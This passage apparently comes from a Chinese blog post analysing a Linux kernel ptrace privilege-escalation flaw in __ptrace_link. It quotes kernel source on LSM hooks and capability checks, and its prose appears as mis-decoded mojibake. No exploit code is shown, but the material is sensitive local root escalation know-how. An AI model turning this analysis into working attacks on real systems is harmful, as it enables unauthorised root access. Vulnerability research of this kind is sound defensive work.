<code>/include/linux/lsm_hooks.h</code> ä¸­ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Security module hook list structure.</span><br><span class="hljs-comment"> * For use with generic list macros for common operations.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">security_hook_list</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span><span class="hljs-title">list</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span>*<span class="hljs-title">head</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">security_list_options</span><span class="hljs-title">hook</span>;</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>å…¶ä¸­è”åˆä½“ <code>security_list_options</code> å…¶å®å°±æ˜¯ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆï¼Œä¸å†èµ˜å™ï¼Œé‚£ä¹ˆ <code>call_int_hook</code> å®çš„ä½œç”¨å°±ä¸è¨€è€Œå–»äº†ï¼šè°ƒç”¨ <code>security_hook_heads</code> ä¸­å¯¹åº”æˆå‘˜çš„å‡½æ•°æŒ‡é’ˆã€‚æˆ‘ä»¬ä¹Ÿå¯ä»¥çœ‹å‡º <code>security_hook_heads</code> ç»“æ„ä½“ç›¸å½“äºä¸€å¼ å‡½æ•°è¡¨</p><p>è¿™å¼ å‡½æ•°è¡¨ä¼šåœ¨å†…æ ¸åˆå§‹åŒ–æ—¶è¢«åˆå§‹åŒ–ï¼Œè¿™é‡Œæˆ‘ä»¬å°†ç›®å…‰æ”¾åˆ°<strong>å†…æ ¸å¯åŠ¨çš„åˆå§‹åŒ–å‡½æ•°</strong>â€”â€”<code>start_kernel()</code> ä¸­ï¼Œè¯¥å‡½æ•°å®šä¹‰äº <code>/init/main.c</code> ä¸­ï¼Œæˆ‘ä»¬è§‚å¯Ÿåˆ°å¦‚ä¸‹é€»è¾‘ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">asmlinkage __visible <span class="hljs-type">void</span> __init <span class="hljs-title function_">start_kernel</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-comment">//...</span><br>    security_init();<br></code></pre></td></tr></table></figure><p>å‡½æ•° <code>security_init()</code> ç”¨ä»¥è¿›è¡Œ LSM çš„åˆå§‹åŒ–ï¼Œå®šä¹‰äº <code>/security/security.c</code> ä¸­ï¼Œè§‚å¯Ÿåˆ°å¦‚ä¸‹è°ƒç”¨é“¾ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">security_init()<br>    capability_add_hooks()<br></code></pre></td></tr></table></figure><p>è¿™é‡Œ <code>capability_add_hooks()</code> é€»è¾‘æ¯”è¾ƒç®€å•ï¼Œå®šä¹‰äº <code>/security/commoncap.c</code> ä¸­ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SECURITY</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">security_hook_list</span> <span class="hljs-title">capability_hooks</span>[] =</span> &#123;<br>LSM_HOOK_INIT(capable, cap_capable),<br>LSM_HOOK_INIT(settime, cap_settime),<br>LSM_HOOK_INIT(ptrace_access_check, cap_ptrace_access_check),<br>LSM_HOOK_INIT(ptrace_traceme, cap_ptrace_traceme),<br>LSM_HOOK_INIT(capget, cap_capget),<br>LSM_HOOK_INIT(capset, cap_capset),<br>LSM_HOOK_INIT(bprm_set_creds, cap_bprm_set_creds),<br>LSM_HOOK_INIT(bprm_secureexec, cap_bprm_secureexec),<br>LSM_HOOK_INIT(inode_need_killpriv, cap_inode_need_killpriv),<br>LSM_HOOK_INIT(inode_killpriv, cap_inode_killpriv),<br>LSM_HOOK_INIT(mmap_addr, cap_mmap_addr),<br>LSM_HOOK_INIT(mmap_file, cap_mmap_file),<br>LSM_HOOK_INIT(task_fix_setuid, cap_task_fix_setuid),<br>LSM_HOOK_INIT(task_prctl, cap_task_prctl),<br>LSM_HOOK_INIT(task_setscheduler, cap_task_setscheduler),<br>LSM_HOOK_INIT(task_setioprio, cap_task_setioprio),<br>LSM_HOOK_INIT(task_setnice, cap_task_setnice),<br>LSM_HOOK_INIT(vm_enough_memory, cap_vm_enough_memory),<br>&#125;;<br><br><span class="hljs-type">void</span> __init <span class="hljs-title function_">capability_add_hooks</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>security_add_hooks(capability_hooks, ARRAY_SIZE(capability_hooks));<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">/* CONFIG_SECURITY */</span></span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œ <code>security_add_hooks()</code> å‡½æ•°å®šä¹‰äº <code>/include/linux/lsm_hooks.h</code> ä¸­ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> <span class="hljs-title function_">security_add_hooks</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> security_hook_list *hooks,</span><br><span class="hljs-params">      <span class="hljs-type">int</span> count)</span><br>&#123;<br><span class="hljs-type">int</span> i;<br><br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; count; i++)<br>list_add_tail_rcu(&amp;hooks[i].<span class="hljs-built_in">list</span>, hooks[i].head);<br>&#125;<br></code></pre></td></tr></table></figure><p>åˆ°è¿™é‡Œæ•´ä¸ªé€»è¾‘å°±ä¸€ç›®äº†ç„¶äº†ï¼Œè¯¥å‡½æ•°è¡¨ä¼šæ ¹æ®è¡¨ <code>capability_hooks</code> è¿›è¡Œå¯¹åº”çš„åˆå§‹åŒ–æ“ä½œ</p><h3 id="ptracer-æƒé™æ£€æŸ¥">ptracer æƒé™æ£€æŸ¥</h3><p>ç°åœ¨è®©æˆ‘ä»¬å°†ç›®å…‰æ”¾å› <code>security_bprm_set_creds()</code>å‡½æ•°ï¼Œæˆ‘ä»¬ç°åœ¨å¯ä»¥çŸ¥é“å…¶è°ƒç”¨çš„åº”å½“æ˜¯ <code>security_hook_heads-&gt;bprm_set_creds-&gt;hook</code>ï¼Œè¿™ä¸ªé’©å­æŒ‡å‘å‡½æ•° <code>cap_bprm_set_creds</code>ï¼Œè¯¥å‡½æ•°å®šä¹‰äº<code>/security/commoncap.c</code> ä¸­ï¼Œæˆ‘ä»¬ä¸»è¦å…³æ³¨å¦‚ä¸‹é€»è¾‘ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">cap_bprm_set_creds</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> linux_binprm *bprm)</span><br>&#123;<br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cred</span> *<span class="hljs-title">old</span> =</span> current_cred();<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cred</span> *<span class="hljs-title">new</span> =</span> bprm-&gt;cred;<br><span class="hljs-type">bool</span> effective, has_cap = <span class="hljs-literal">false</span>, is_setid;<br><span class="hljs-type">int</span> ret;<br><span class="hljs-type">kuid_t</span> root_uid;<br><br>    <span class="hljs-comment">//...</span><br><br>    <span class="hljs-comment">// ç¬”è€…æ³¨ï¼šå¯¹è¢« ptrace çš„ suid/sgid è¿›ç¨‹è¿›è¡Œæƒé™æ£€æŸ¥</span><br>    <span class="hljs-comment">/* Don&#x27;t let someone trace a set[ug]id/setpcap binary with the revised</span><br><span class="hljs-comment"> * credentials unless they have the appropriate permit.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * In addition, if NO_NEW_PRIVS, then ensure we get no new privs.</span><br><span class="hljs-comment"> */</span><br>is_setid = !uid_eq(new-&gt;euid, old-&gt;uid) || !gid_eq(new-&gt;egid, old-&gt;gid);<br><br><span class="hljs-keyword">if</span> ((is_setid || <span class="hljs-comment">// æ˜¯å¦ä¸º suid/sgid</span><br>     !cap_issubset(new-&gt;cap_permitted, old-&gt;cap_permitted)) &amp;&amp;<br>    ((bprm-&gt;unsafe &amp; ~LSM_UNSAFE_PTRACE) ||<br>     !ptracer_capable(current, new-&gt;user_ns))) &#123; <span class="hljs-comment">// æ˜¯å¦è¢« ptraceï¼Œè‹¥æ˜¯ï¼Œæ£€æŸ¥æ˜¯å¦è¶Šæƒ</span><br><span class="hljs-comment">/* downgrade; they get no more than they had, and maybe less */</span><br>        <span class="hljs-comment">//è‹¥æ£€æŸ¥å‡ºè¶Šæƒï¼Œåˆ™é‡æ–°è¿›è¡Œä¸€æ¬¡æ£€æŸ¥ï¼Œè¿›è¡Œé™æƒ</span><br><span class="hljs-keyword">if</span> (!ns_capable(new-&gt;user_ns, CAP_SETUID) ||<br>    (bprm-&gt;unsafe &amp; LSM_UNSAFE_NO_NEW_PRIVS)) &#123;<br>new-&gt;euid = new-&gt;uid;<br>new-&gt;egid = new-&gt;gid;<br>&#125;<br>new-&gt;cap_permitted = cap_intersect(new-&gt;cap_permitted,<br>   old-&gt;cap_permitted);<br>&#125;<br><br>new-&gt;suid = new-&gt;fsuid = new-&gt;euid;<br>new-&gt;sgid = new-&gt;fsgid = new-&gt;egid;<br>    <span class="hljs-comment">//...</span><br></code></pre></td></tr></table></figure><p>å…¶ä¸­ <code>ptracer_capable()</code> å®šä¹‰äº <code>/kernel/capability.c</code> ä¸­ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * ptracer_capable - Determine if the ptracer holds CAP_SYS_PTRACE in the namespace</span><br><span class="hljs-comment"> * @tsk: The task that may be ptraced</span><br><span class="hljs-comment"> * @ns: The user namespace to search for CAP_SYS_PTRACE in</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Return true if the task that is ptracing the current task had CAP_SYS_PTRACE</span><br><span class="hljs-comment"> * in the specified user namespace.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">bool</span> <span class="hljs-title function_">ptracer_capable</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> task_struct *tsk, <span class="hljs-keyword">struct</span> user_namespace *ns)</span><br>&#123;<br><span class="hljs-type">int</span> ret = <span class="hljs-number">0</span>;  <span class="hljs-comment">/* An absent tracer adds no restrictions */</span><br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cred</span> *<span class="hljs-title">cred</span>;</span><br>rcu_read_lock();<br>cred = rcu_dereference(tsk-&gt;ptracer_cred);<br><span class="hljs-keyword">if</span> (cred)<br>ret = security_capable_noaudit(cred, ns, CAP_SYS_PTRACE);<br>rcu_read_unlock();<br><span class="hljs-keyword">return</span> (ret == <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>è¯¥å‡½æ•°æ£€æŸ¥äº†è¿›ç¨‹çš„ <code>ptracer_cred</code> å­—æ®µï¼Œè‹¥ä¸ä¸º NULL åˆ™è¯´æ˜è¯¥è¿›ç¨‹ä¸º ptraceeï¼Œæ¥ä¸‹æ¥ä½¿ç”¨ <code>security_capable_noaudit</code> å‡½æ•°è¿›è¡Œæ£€æŸ¥ï¼Œè¯¥å‡½æ•°ä¹Ÿæ˜¯ä¸€ä¸ª LSM é’©å­çš„ APIï¼Œå¯¹åº”è°ƒç”¨ <code>security_hook_heads-&gt;capable-&gt;hook</code>ï¼Œå¯¹åº”å‡½æ•°ä¸º <code>cap_capable()</code>ï¼Œå®šä¹‰äº <code>/security/commoncap.c</code> ä¸­ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * cap_capable - Determine whether a task has a particular effective capability</span><br><span class="hljs-comment"> * @cred: The credentials to use</span><br><span class="hljs-comment"> * @ns:  The user namespace in which we need the capability</span><br><span class="hljs-comment"> * @cap: The capability to check for</span><br><span class="hljs-comment"> * @audit: Whether to write an audit message or not</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Determine whether the nominated task has the specified capability amongst</span><br><span class="hljs-comment"> * its effective set, returning 0 if it does, -ve if it does not.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * NOTE WELL: cap_has_capability() cannot be used like the kernel&#x27;s capable()</span><br><span class="hljs-comment"> * and has_capability() functions.  That is, it has the reverse semantics:</span><br><span class="hljs-comment"> * cap_has_capability() returns 0 when a task has a capability, but the</span><br><span class="hljs-comment"> * kernel&#x27;s capable() and has_capability() returns 1 for this case.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">cap_capable</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> cred *cred, <span class="hljs-keyword">struct</span> user_namespace *targ_ns,</span><br><span class="hljs-params"><span class="hljs-type">int</span> cap, <span class="hljs-type">int</span> audit)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_namespace</span> *<span class="hljs-title">ns</span> =</span> targ_ns;<br><br><span class="hljs-comment">/* See if cred has the capability in the target user namespace</span><br><span class="hljs-comment"> * by examining the target user namespace and all of the target</span><br><span class="hljs-comment"> * user namespace&#x27;s parents.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">for</span> (;;) &#123;<br><span class="hljs-comment">/* Do we have the necessary capabilities? */</span><br>        <span class="hljs-comment">// è‹¥ä¸ ptracer åŒå±åŒä¸€å‘½åç©ºé—´ï¼Œæ£€æŸ¥æƒé™æ˜¯å¦è¶³å¤Ÿ</span><br><span class="hljs-keyword">if</span> (ns == cred-&gt;user_ns)<br><span class="hljs-keyword">return</span> cap_raised(cred-&gt;cap_effective, cap) ? <span class="hljs-number">0</span> : -EPERM;<br><br><span class="hljs-comment">/* Have we tried all of the parent namespaces? */</span><br>        <span class="hljs-comment">// è‡ªåº•å‘ä¸Šéå†å®Œäº†ï¼Œè¯´æ˜æ£€æŸ¥å‡ºé”™ï¼Œè¿”å›å¯¹åº”é”™è¯¯å€¼</span><br><span class="hljs-keyword">if</span> (ns == &amp;init_user_ns)<br><span class="hljs-keyword">return</span> -EPERM;<br><br><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * The owner of the user namespace in the parent of the</span><br><span class="hljs-comment"> * user namespace has all caps.</span><br><span class="hljs-comment"> */</span><br>        <span class="hljs-comment">// æˆ‘ä»¬ä¸»è¦å…³æ³¨è¿™é‡Œï¼Œè¿™é‡Œä¼šæ£€æŸ¥ ptracer_cred çš„å‘½åç©ºé—´æ˜¯å¦æ˜¯æ–°è¿›ç¨‹å‘½åç©ºé—´çš„çˆ¶å‘½åç©ºé—´</span><br>        <span class="hljs-comment">// è‹¥æ˜¯ï¼Œæ£€æŸ¥æ˜¯å¦æ–°è¿›ç¨‹å‘½åç©ºé—´çš„æ‰€æœ‰è€…æ˜¯å¦ä¸ ptracer ä¸ºåŒä¸€ç”¨æˆ·</span><br>        <span class="hljs-comment">// è‹¥æ˜¯ï¼Œè¿”å› 0ï¼Œè¯´æ˜é€šè¿‡æ£€æŸ¥</span><br>        <span class="hljs-comment">// è‹¥å¦ï¼Œå‘ä¸Šéå†å‘½åç©ºé—´ï¼Œå›åˆ°å¼€å¤´</span><br><span class="hljs-keyword">if</span> ((ns-&gt;parent == cred-&gt;user_ns) &amp;&amp; uid_eq(ns-&gt;owner, cred-&gt;euid))<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * If you have a capability in a parent user ns, then you have</span><br><span class="hljs-comment"> * it over all children user namespaces as well.</span><br><span class="hljs-comment"> */</span><br>ns = ns-&gt;parent;<br>&#125;<br><br><span class="hljs-comment">/* We never get here */</span><br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œä¼šæ£€æŸ¥ ptracee çš„å‘½åç©ºé—´æ‰€æœ‰è€…æ˜¯å¦ä¸ ptracer ä¸ºåŒä¸€ç”¨æˆ·ï¼Œ<strong>åªæœ‰è¿™ä¸¤è€…åŒå±åŒä¸€ç”¨æˆ·ï¼Œæ£€æŸ¥æ‰èƒ½é€šè¿‡ï¼Œå¦åˆ™æ£€æŸ¥å°†ä¸ä¼šé€šè¿‡ï¼Œä»è€Œå¯¼è‡´é™æƒ</strong></p><p>æ¥ä¸‹æ¥çš„åˆ¤æ–­è¯­å¥ä¸­è°ƒç”¨çš„ <code>ns_capable()</code> å‡½æ•°æœ€ç»ˆä¹Ÿä¼šèµ°åˆ°è¿™ä¸ªè·¯å¾„ï¼Œè¿™é‡Œä¾¿ä¸å†èµ˜å™ï¼Œæ„Ÿå…´è¶£çš„å¯ä»¥è‡ªè¡Œæ£€ç´¢é˜…è¯»å¦‚ä¸‹è°ƒç”¨é“¾ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">ns_capable()<br>ns_capable_common()<br>        security_capable()<br>            cap_capable()<br></code></pre></td></tr></table></figure><p>ç”±æ­¤æˆ‘ä»¬å¾—åˆ°ç»“è®ºï¼š<strong>è‹¥ ptracee è¿›ç¨‹æ‰§è¡Œ suid/sgid ç¨‹åºï¼Œåˆ™æ£€æŸ¥ ptracee ä¿å­˜çš„ ptracer çš„ credï¼Œå³ ptracee çš„ task_struct çš„ ptracer_cred å­—æ®µçš„æƒé™ï¼Œè‹¥æƒé™ä¸è¶³åˆ™ ptracee ä»¥å…¶è‡ªèº«çš„ euid/egid æ‰§è¡Œç¨‹åºï¼Œè€Œéæ–‡ä»¶çš„ suid/sgid</strong></p><h2 id="LSM-ä¸-ptracer-æƒé™æ£€æŸ¥">LSM ä¸ ptracer æƒé™æ£€æŸ¥</h2><p>å‰é¢æˆ‘ä»¬è®²äº†å¯¹ ptracee æ‰§è¡Œæ–°ç¨‹åºçš„æƒé™æ£€æŸ¥ï¼Œç°åœ¨æˆ‘ä»¬æ¥çœ‹å¯¹äº ptracer æ“ä½œçš„æ£€æŸ¥</p><p>å°†ç›®å…‰æ”¾å› ptrace ç³»ç»Ÿè°ƒç”¨çš„æºç ä¸­ï¼Œå¯¹äº ptracer çš„ <code>PTRACE_PEEKTEXT / PTRACE_PEEKDATA / PTRACE_POKETEXT / PTRACE_POKEDATA</code> è¿™å‡ ä¸ªæ“ä½œï¼Œä¼šèµ°å…¥å¦‚ä¸‹è·¯å¾„ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">SYS_ptrace()<br>    arch_ptrace()<br>    ptrace_request()<br>    generic_ptrace_peekdata() / generic_ptrace_pokedata()<br>    ptrace_access_vm()<br>    ptracer_capable()<br>    security_capable_noaudit()<br></code></pre></td></tr></table></figure><p>è¿™é‡Œå°±åˆèµ°å›æˆ‘ä»¬ä¸Šé¢çš„è·¯å¾„äº†ï¼Œä¸å†é‡å¤åˆ†æï¼Œè¿™é‡Œç®€å•è¯´æ˜ä¸€ç‚¹å°±æ˜¯åœ¨ <code>ptrace_request()</code> ä¸­ä¼ ç»™ä¸‹å±‚è¢«è°ƒå‡½æ•°çš„ task å‚æ•°ä¸º ptracee çš„ task_structï¼Œåœ¨ <code>ptrace_access_vm()</code> ä¸­ä¼ å…¥çš„å‘½åç©ºé—´ä¹Ÿä¸º ptracee çš„ mm çš„å‘½åç©ºé—´ï¼Œå› æ­¤<strong>æœ€åæƒé™åˆ¤æ–­è¿˜æ˜¯æ ¹æ® ptracee è¿›ç¨‹çš„</strong> <code>ptracer_cred</code> <strong>å­—æ®µ</strong></p><h1>0x01.æ¼æ´åˆ†æ</h1><p>ç»†å¿ƒçš„è¯»è€…æˆ–è®¸å·²ç»è§‚å¯Ÿåˆ°äº†ï¼Œå‰é¢æˆ‘ä»¬çš„é¢„å¤‡çŸ¥è¯†ä¸­ç¼ºå°‘äº†<strong>è®¾ç½® ptracee çš„ ptracer_cred å­—æ®µ</strong>è¿™ä¸€è¿‡ç¨‹ï¼Œå®é™…ä¸Š<strong>æˆ‘ä»¬çš„æ¼æ´ä¾¿æ˜¯å‡ºç°åœ¨è¿™ä¸ªä½ç½®</strong></p><p>æˆ‘ä»¬å°†ç›®å…‰é‡æ–°æ”¾å› ptrace ç³»ç»Ÿè°ƒç”¨çš„æºç å½“ä¸­ï¼Œå½“ ptracee è¿›ç¨‹è°ƒç”¨ <code>ptrace(PTRACE_TRACEME, 0, NULL, NULL);</code> æ—¶ï¼Œä¼šèµ°åˆ°å¦‚ä¸‹è·¯å¾„ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">SYS_ptrace()<br>    ptrace_traceme()<br>    __ptrace_link()<br></code></pre></td></tr></table></figure><p>å…¶ä¸­ <code>__ptrace_link()</code> å‡½æ•°<strong>å°±æ˜¯æœ¬æ¬¡å‡ºç°æ¼æ´çš„å‡½æ•°</strong>ï¼Œè¯¥å‡½æ•°ç”¨äºå»ºç«‹ ptrace linkï¼Œå®šä¹‰äº <code>/kernel/ptrace.c</code> ä¸­ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * ptrace a task: make the debugger its new parent and</span><br><span class="hljs-comment"> * move it to the ptrace list.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Must be called with the tasklist lock write-held.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">void</span> __ptrace_link(<span class="hljs-keyword">struct</span> task_struct *child, <span class="hljs-keyword">struct</span> task_struct *new_parent)<br>&#123;<br>BUG_ON(!list_empty(&amp;child-&gt;ptrace_entry));<br>list_add(&amp;child-&gt;ptrace_entry, &amp;new_parent-&gt;ptraced);<br>child-&gt;parent = new_parent;<br>rcu_read_lock();<br>child-&gt;ptracer_cred = get_cred(__task_cred(new_parent));<br>rcu_read_unlock();<br>&#125;<br></code></pre></td></tr></table></figure><p>è¯¥å‡½æ•°çš„åŠŸèƒ½æ¯”è¾ƒç®€å•ï¼Œä¸»è¦å°±æ˜¯åœ¨ rcu æœºåˆ¶ä¸‹å°†å­è¿›ç¨‹çš„ <code>ptracer_cred</code> å­—æ®µè®¾ä¸º<strong>çˆ¶è¿›ç¨‹çš„ cred</strong>ï¼Œè¿™é‡Œçš„ <code>__task_cred()</code> å®çš„ä½œç”¨ä¸»è¦æ˜¯ rcu æœºåˆ¶ä¸‹å–å¾—è¿›ç¨‹ real_credï¼Œè€Œ <code>get_cred()</code> å‡½æ•°ä¸»è¦æ˜¯å°† cred çš„å¼•ç”¨è®¡æ•° + 1</p><blockquote><p>RCU æœºåˆ¶å³ ready-copy update ï¼Œè¯¥æœºåˆ¶ç¡®ä¿äº†å¤šçº¿ç¨‹ä¸‹è¯»ä¸å†™çš„åŒæ­¥ï¼Œè¿™é‡Œä¸è¯¦ç»†ä»‹ç»ï¼ŒåŸç†å¯ä»¥ç®€å•ç†è§£ä¸ºâ€œèŠ‚ç‚¹æ›´æ–°â€â€”â€”è¯»æ— é™åˆ¶ï¼Œè¦å†™æ—¶å…ˆæ–°å»ºèŠ‚ç‚¹å†™å…¥æ–°èŠ‚ç‚¹ï¼Œéšåå°†èŠ‚ç‚¹æ›´æ–°åˆ°æŒ‡é’ˆï¼Œè¿™ä¸ªè¿‡ç¨‹ä¸­è¯»è€…è¯»çš„éƒ½æ˜¯æ—§èŠ‚ç‚¹ï¼Œéšåç­‰å¾…è¯»è€…é€€å‡ºï¼Œé‡Šæ”¾æ—§èŠ‚ç‚¹ï¼Œæ–°èŠ‚ç‚¹æŠ•å…¥ä½¿ç”¨</p></blockquote><p>æŒ‰ç…§  Jann Horn çš„ <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=6994eefb0053799d2e07cd140df6c2ea106c41ee">issue</a> é˜è¿°ï¼Œåœ¨è¿™é‡Œå­˜åœ¨ç€<strong>ä¸¤ä¸ªé—®é¢˜</strong>ï¼š</p><ul><li>ç«æ€æ¡ä»¶ä¸‹å¯¼è‡´é”™è¯¯çš„å¼•ç”¨è®¡æ•°</li><li>ptracer_cred è®¾ç½®çš„é€»è¾‘é”™è¯¯å¯¼è‡´æœ¬åœ°ææƒ</li></ul><p>ä¸‹é¢æˆ‘ä»¬æ¥é€ä¸€åˆ†æ</p><h2 id="ç«æ€æ¡ä»¶ä¸‹å¯¼è‡´é”™è¯¯çš„å¼•ç”¨è®¡æ•°">ç«æ€æ¡ä»¶ä¸‹å¯¼è‡´é”™è¯¯çš„å¼•ç”¨è®¡æ•°</h2><p>åœ¨ <code>__ptrace_link()</code> å‡½æ•°ä¸­è°ƒç”¨äº† <code>get_cred()</code> å‡½æ•°è·å–çˆ¶è¿›ç¨‹çš„ 